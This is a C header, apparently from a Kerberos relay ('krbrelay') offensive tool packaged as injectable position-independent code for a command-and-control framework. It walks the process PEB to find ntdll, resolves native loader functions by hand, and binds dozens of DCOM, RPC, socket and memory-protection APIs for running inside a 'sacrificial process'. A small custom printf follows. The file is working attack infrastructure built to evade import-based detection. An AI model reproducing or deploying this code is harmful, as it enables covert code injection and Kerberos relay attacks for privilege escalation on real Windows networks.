#pragma once

/*
 * Minimal loader support for the injected raw blob. It walks the target's PEB
 * to locate ntdll, resolves the two native loader functions from ntdll's PE
 * export table, loads required system DLLs, and fills the function-pointer
 * slots emitted by BOF_IMPORT. No import directory or PE mapping is needed.
 */

typedef struct _PIC_LIST { struct _PIC_LIST *Flink,*Blink; } PIC_LIST;
typedef struct { USHORT Length,MaximumLength; PWSTR Buffer; } PIC_UNICODE;
typedef struct { USHORT Length,MaximumLength; PCHAR Buffer; } PIC_ANSI;
typedef LONG (NTAPI *PIC_LDR_LOAD_DLL)(PWSTR,PULONG,PIC_UNICODE*,HMODULE*);
typedef LONG (NTAPI *PIC_LDR_GET_PROC)(HMODULE,PIC_ANSI*,ULONG,PVOID*);

static void *pic_ntdll(void) {
    /* On x64 Windows GS:[0x60] points to the PEB. Search the loader list by
       Unicode basename instead of assuming a module load address. */
    BYTE *peb,*ldr,*entry; PIC_LIST *head,*link; PIC_UNICODE *base_name;
    const WCHAR wanted[]={L'n',L't',L'd',L'l',L'l',L'.',L'd',L'l',L'l'};
    int i;
    __asm__ __volatile__("mov %%gs:0x60,%0":"=r"(peb));
    if (!peb || !(ldr=*(BYTE **)(peb+0x18))) return NULL;
    head=(PIC_LIST *)(ldr+0x20);
    for(link=head->Flink;link&&link!=head;link=link->Flink) {
        entry=(BYTE *)link-0x10;base_name=(PIC_UNICODE *)(entry+0x58);
        if (!base_name->Buffer || base_name->Length != sizeof(wanted)) continue;
        for(i=0;i<9;i++) {
            WCHAR a=base_name->Buffer[i],b=wanted[i];
            if(a>=L'A'&&a<=L'Z')a+=L'a'-L'A';
            if(a!=b)break;
        }
        if(i==9)return *(void **)(entry+0x30);
    }
    return NULL;
}

static void *pic_export(void *module,const char *wanted) {
    /* Resolve an exported name from an already-loaded module. Forwarded
       exports are not required for the two ntdll functions used here. */
    BYTE *base=(BYTE *)module,*names,*functions,*ordinals,*name; IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS64 *nt; IMAGE_EXPORT_DIRECTORY *exports; DWORD i,j;
    if(!base)return NULL;dos=(IMAGE_DOS_HEADER *)base;
    if(dos->e_magic!=IMAGE_DOS_SIGNATURE)return NULL;
    nt=(IMAGE_NT_HEADERS64 *)(base+dos->e_lfanew);
    if(nt->Signature!=IMAGE_NT_SIGNATURE)return NULL;
    exports=(IMAGE_EXPORT_DIRECTORY *)(base+nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if(exports==(IMAGE_EXPORT_DIRECTORY *)base)return NULL;
    names=base+exports->AddressOfNames;functions=base+exports->AddressOfFunctions;ordinals=base+exports->AddressOfNameOrdinals;
    for(i=0;i<exports->NumberOfNames;i++) {
        name=base+*(DWORD *)(names+i*4);
        for(j=0;wanted[j]&&name[j]==(BYTE)wanted[j];j++);
        if(!wanted[j]&&!name[j])return base+*(DWORD *)(functions+(*(WORD *)(ordinals+i*2))*4);
    }
    return NULL;
}

static HMODULE pic_load(PIC_LDR_LOAD_DLL load,const char *ascii) {
    /* LdrLoadDll accepts UNICODE_STRING and does not require kernel32 imports. */
    WCHAR wide[32]; PIC_UNICODE name; ULONG flags=0; HMODULE module=NULL; int n=0;
    while(ascii[n]&&n<31){wide[n]=(WCHAR)(BYTE)ascii[n];n++;}wide[n]=0;
    name.Buffer=wide;name.Length=(USHORT)(n*2);name.MaximumLength=(USHORT)((n+1)*2);
    if(load(NULL,&flags,&name,&module)<0)return NULL;return module;
}

static int pic_bind(PIC_LDR_GET_PROC get,HMODULE module,const char *name,void **slot) {
    /* Populate one PIC_DATA function slot by exact ANSI export name. */
    PIC_ANSI ansi;int n=0;while(name[n]&&n<255)n++;
    ansi.Buffer=(PCHAR)name;ansi.Length=(USHORT)n;ansi.MaximumLength=(USHORT)(n+1);
    return get(module,&ansi,0,slot)>=0&&*slot;
}

#define PIC_BIND(get,module,dll,name) if(!pic_bind(get,module,#name,(void **)&dll##$##name))return 0

static int krbrelay_pic_resolve(void) {
    /* Resolution is all-or-nothing: returning with a NULL slot would turn a
       controlled launch error into a crash in the sacrificial process. */
    HMODULE ntdll=(HMODULE)pic_ntdll(),kernel32,ole32,crypt32,rpcrt4,advapi32,secur32,ws2_32;
    PIC_LDR_LOAD_DLL load;PIC_LDR_GET_PROC get;
    if(!ntdll)return 0;
    load=(PIC_LDR_LOAD_DLL)pic_export(ntdll,"LdrLoadDll");
    get=(PIC_LDR_GET_PROC)pic_export(ntdll,"LdrGetProcedureAddress");
    if(!load||!get)return 0;
    kernel32=pic_load(load,"kernel32.dll");ole32=pic_load(load,"ole32.dll");crypt32=pic_load(load,"crypt32.dll");
    rpcrt4=pic_load(load,"rpcrt4.dll");advapi32=pic_load(load,"advapi32.dll");secur32=pic_load(load,"secur32.dll");ws2_32=pic_load(load,"ws2_32.dll");
    if(!kernel32||!ole32||!crypt32||!rpcrt4||!advapi32||!secur32||!ws2_32)return 0;
    PIC_BIND(get,kernel32,KERNEL32,GetProcessHeap);PIC_BIND(get,kernel32,KERNEL32,HeapAlloc);PIC_BIND(get,kernel32,KERNEL32,HeapFree);
    PIC_BIND(get,kernel32,KERNEL32,GetCurrentProcess);PIC_BIND(get,kernel32,KERNEL32,GetModuleHandleW);PIC_BIND(get,kernel32,KERNEL32,GetProcAddress);
    PIC_BIND(get,kernel32,KERNEL32,GetLastError);PIC_BIND(get,kernel32,KERNEL32,GetStdHandle);PIC_BIND(get,kernel32,KERNEL32,WriteFile);PIC_BIND(get,kernel32,KERNEL32,CloseHandle);PIC_BIND(get,kernel32,KERNEL32,Sleep);
    PIC_BIND(get,kernel32,KERNEL32,CreateThread);PIC_BIND(get,kernel32,KERNEL32,WaitForSingleObject);PIC_BIND(get,kernel32,KERNEL32,VirtualProtect);
    PIC_BIND(get,kernel32,KERNEL32,GlobalLock);PIC_BIND(get,kernel32,KERNEL32,GlobalUnlock);PIC_BIND(get,kernel32,KERNEL32,GlobalSize);
    PIC_BIND(get,ntdll,NTDLL,NtQueryInformationProcess);
    PIC_BIND(get,ole32,OLE32,CoInitializeEx);PIC_BIND(get,ole32,OLE32,CoInitializeSecurity);PIC_BIND(get,ole32,OLE32,CreateILockBytesOnHGlobal);
    PIC_BIND(get,ole32,OLE32,StgCreateDocfileOnILockBytes);PIC_BIND(get,ole32,OLE32,CoGetInstanceFromIStorage);PIC_BIND(get,ole32,OLE32,CLSIDFromString);
    PIC_BIND(get,ole32,OLE32,CreateStreamOnHGlobal);PIC_BIND(get,ole32,OLE32,GetHGlobalFromStream);PIC_BIND(get,ole32,OLE32,CoMarshalInterface);
    PIC_BIND(get,ole32,OLE32,CreateObjrefMoniker);PIC_BIND(get,ole32,OLE32,CreateBindCtx);PIC_BIND(get,ole32,OLE32,CoTaskMemFree);PIC_BIND(get,ole32,OLE32,CoTaskMemAlloc);PIC_BIND(get,ole32,OLE32,CoUninitialize);
    PIC_BIND(get,crypt32,CRYPT32,CryptStringToBinaryW);
    PIC_BIND(get,rpcrt4,RPCRT4,RpcServerUseProtseqEpW);PIC_BIND(get,rpcrt4,RPCRT4,RpcServerRegisterAuthInfoW);PIC_BIND(get,rpcrt4,RPCRT4,RpcServerRegisterIfEx);
    PIC_BIND(get,rpcrt4,RPCRT4,RpcServerUnregisterIf);PIC_BIND(get,rpcrt4,RPCRT4,RpcStringBindingComposeW);PIC_BIND(get,rpcrt4,RPCRT4,RpcBindingFromStringBindingW);
    PIC_BIND(get,rpcrt4,RPCRT4,RpcEpResolveBinding);PIC_BIND(get,rpcrt4,RPCRT4,RpcBindingSetAuthInfoW);PIC_BIND(get,rpcrt4,RPCRT4,RpcBindingFree);
    PIC_BIND(get,rpcrt4,RPCRT4,RpcStringFreeW);PIC_BIND(get,rpcrt4,RPCRT4,UuidCreate);PIC_BIND(get,rpcrt4,RPCRT4,I_RpcGetBuffer);
    PIC_BIND(get,rpcrt4,RPCRT4,I_RpcSend);PIC_BIND(get,rpcrt4,RPCRT4,I_RpcSendReceive);PIC_BIND(get,rpcrt4,RPCRT4,I_RpcFreeBuffer);
    PIC_BIND(get,secur32,SECUR32,InitSecurityInterfaceW);
    PIC_BIND(get,ws2_32,WS2_32,WSAStartup);PIC_BIND(get,ws2_32,WS2_32,WSACleanup);PIC_BIND(get,ws2_32,WS2_32,socket);PIC_BIND(get,ws2_32,WS2_32,getaddrinfo);
    PIC_BIND(get,ws2_32,WS2_32,freeaddrinfo);PIC_BIND(get,ws2_32,WS2_32,connect);PIC_BIND(get,ws2_32,WS2_32,send);PIC_BIND(get,ws2_32,WS2_32,recv);PIC_BIND(get,ws2_32,WS2_32,closesocket);
    return 1;
}

/* Bounded formatter used for relay diagnostics. It intentionally supports
   only the format verbs present in krbrelay.c and writes to inherited stdio. */
static int pic_putc(char *out,int used,int capacity,char c){if(used<capacity)out[used++]=c;return used;}
static int pic_puts(char *out,int used,int capacity,const char *s){if(!s)s="(null)";while(*s&&used<capacity)out[used++]=*s++;return used;}
static int pic_uint(char *out,int used,int capacity,unsigned long value,unsigned base,int width) {
    const char digits[]="0123456789abcdef";char scratch[24];int n=0;
    do{scratch[n++]=digits[value%base];value/=base;}while(value&&n<(int)sizeof(scratch));
    while(n<width) scratch[n++]='0';while(n&&used<capacity)out[used++]=scratch[--n];return used;
}
static void pic_printf(int type,const char *format,...) {
    char output[768];int used=0;DWORD wrote=0;HANDLE handle;__builtin_va_list ap;
    __builtin_va_start(ap,format);
    while(*format&&used<(int)sizeof(output)) {
        if(*format!='%'){used=pic_putc(output,used,sizeof(output),*format++);continue;}
        format++;{int width=0,is_long=0;while(*format>='0'&&*format<='9'){width=width*10+(*format++-'0');}if(*format=='l'){is_long=1;format++;}
            if(*format=='s')used=pic_puts(output,used,sizeof(output),__builtin_va_arg(ap,char *));
            else if(*format=='d'){long v=is_long?__builtin_va_arg(ap,long):__builtin_va_arg(ap,int);if(v<0){used=pic_putc(output,used,sizeof(output),'-');v=-v;}used=pic_uint(output,used,sizeof(output),(unsigned long)v,10,width);}
            else if(*format=='u')used=pic_uint(output,used,sizeof(output),is_long?__builtin_va_arg(ap,unsigned long):__builtin_va_arg(ap,unsigned),10,width);
            else if(*format=='x')used=pic_uint(output,used,sizeof(output),is_long?__builtin_va_arg(ap,unsigned long):__builtin_va_arg(ap,unsigned),16,width);
            else used=pic_putc(output,used,sizeof(output),'%');if(*format)format++;
        }
    }
    __builtin_va_end(ap);handle=KERNEL32$GetStdHandle(type==CALLBACK_ERROR?STD_ERROR_HANDLE:STD_OUTPUT_HANDLE);
    if(handle&&handle!=INVALID_HANDLE_VALUE)KERNEL32$WriteFile(handle,output,(DWORD)used,&wrote,NULL);
}
